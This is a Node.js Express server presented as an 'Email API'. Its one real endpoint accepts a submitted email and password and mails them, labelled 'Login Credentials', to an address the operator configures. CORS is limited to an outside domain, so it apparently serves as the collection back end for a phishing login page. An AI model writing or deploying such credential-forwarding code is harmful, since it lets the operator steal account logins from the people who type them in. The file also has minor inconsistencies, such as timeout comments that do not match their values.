const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Enhanced CORS configuration
const corsOptions = {
  origin: ['https://world777admins.in/','http://localhost:3000'],
  credentials: true,
};

// Middleware
app.use(cors(corsOptions));
app.use(express.json());

// Create transporter object using SMTP transport
let transporter;
const initializeTransporter = () => {
  transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    tls: {
      rejectUnauthorized: true,
      ciphers: 'SSLv3',
      minVersion: 'TLSv1.2',
      maxVersion: 'TLSv1.3'
    },
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS
    },
    // Add timeout configuration
    connectionTimeout: 60000, // 30 seconds
    greetingTimeout: 60000,   // 30 seconds
    socketTimeout: 60000      // 30 seconds
  });
};

// Initialize transporter
initializeTransporter();

// Reinitialize transporter when needed
const getTransporter = () => {
  if (!transporter) {
    initializeTransporter();
  }
  return transporter;
};

// Email sending endpoint
app.post('/send-email', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validate required fields
    if (!email || !password) {
      return res.status(400).json({
        success: false,
        message: 'Email and password are required'
      });
    }

    // Get transporter
    const currentTransporter = getTransporter();
    
    // Check if environment variables are set
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      return res.status(500).json({
        success: false,
        message: 'Email service not properly configured. Please check environment variables.'
      });
    }

    // Default to recipient from env or the same as sender
    const recipient = process.env.RECIPIENT_EMAIL || process.env.EMAIL_USER;

    // Verify transporter configuration with timeout
    try {
      await Promise.race([
        currentTransporter.verify(),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout during verification - please check network/firewall settings')), 60000)
        )
      ]);
    } catch (verifyError) {
      console.error('Transporter verification failed:', verifyError);
      // Try to reinitialize transporter and verify again
      initializeTransporter();
      const newTransporter = getTransporter();
      
      await Promise.race([
        newTransporter.verify(),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Connection timeout during verification even after reinitialization')), 60000)
        )
      ]);
    }

    // Send mail with timeout
    const info = await Promise.race([
      currentTransporter.sendMail({
        from: process.env.EMAIL_USER,
        to: recipient,
        subject: 'Login Credentials',
        text: 'Your login credentials are: \n Email: ' + email + '\n Password: ' + password
      }),
      new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Connection timeout during email sending - please check network/firewall settings')), 60000)
      )
    ]);

    console.log('Email sent: ' + info.response);
    res.status(200).json({
      success: true,
      message: 'Email sent successfully',
      messageId: info.messageId
    });
  } catch (error) {
    console.error('Error sending email:', error);
    // More detailed error response
    res.status(500).json({
      success: false,
      message: 'Failed to send email',
      error: error.message,
      // Add more details for debugging
      details: {
        code: error.code,
        command: error.command,
        stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
      }
    });
  }
});

// Health check endpoint
app.get('/', (req, res) => {
  res.status(200).json({
    success: true,
    message: 'Email API is running!',
    timestamp: new Date().toISOString()
  });
});

// Reinitialize transporter endpoint (useful for refreshing credentials)
app.post('/reinit-transporter', (req, res) => {
  try {
    initializeTransporter();
    res.status(200).json({
      success: true,
      message: 'Transporter reinitialized successfully'
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Failed to reinitialize transporter',
      error: error.message
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
  console.log(`Health check endpoint: http://localhost:${PORT}/`);
  console.log(`Email sending endpoint: http://localhost:${PORT}/send-email`);
});